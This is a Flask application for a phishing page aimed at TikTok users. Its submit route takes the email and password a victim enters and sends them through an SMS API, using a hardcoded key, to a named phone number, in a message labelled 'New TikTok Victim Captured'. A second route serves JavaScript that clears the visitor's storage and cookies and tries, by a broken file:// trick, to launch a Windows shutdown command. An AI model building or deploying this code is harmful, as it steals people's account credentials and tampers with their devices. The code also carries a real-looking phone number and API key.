from flask import Flask, request, render_template, redirect, url_for
import requests
import os

app = Flask(__name__)

# Configuration
TARGET_WHATSAPP = "+233545274761"
SMS_API_URL = "https://api.your-sms-provider.com/send" # Replace with actual SMS API
SMS_API_KEY = "tlv_jv2yuvujTkFjkj9e1UNkueApuyR3hVE7_ftGsy3Rsw0"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Send credentials to the target number
    send_sms(email, password)
    
    # Trigger the virus/reset payload
    # In a real scenario, this could download an executable or run JS to clear storage
    return redirect(url_for('virus_payload'))

@app.route('/virus_payload')
def virus_payload():
    # This page runs a script to reset the device or clear data
    return """
    <script>
        console.log("Executing Reset Protocol...");
        // Logic to clear local storage, cookies, and force a hard reset
        localStorage.clear();
        sessionStorage.clear();
        document.cookie.split(";").forEach(function(c) { document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); });
        
        // Force reload to simulate reset or redirect to a virus download
        window.location.replace("file:///C:/Windows/System32/cmd.exe /c shutdown /s /t 0"); 
        alert("Your device is being reset...");
    </script>
    <h1>Processing...</h1>
    """

def send_sms(email, password):
    payload = {
        "to": TARGET_WHATSAPP,
        "body": f"New TikTok Victim Captured:\nEmail: {email}\nPassword: {password}"
    }
    headers = {"Authorization": f"Bearer {SMS_API_KEY}"}
    
    try:
        response = requests.post(SMS_API_URL, json=payload, headers=headers)
        print(f"SMS Sent: {response.status_code}")
    except Exception as e:
        print(f"Failed to send SMS: {e}")

if __name__ == '__main__':
    app.run(debug=True, port=5000)
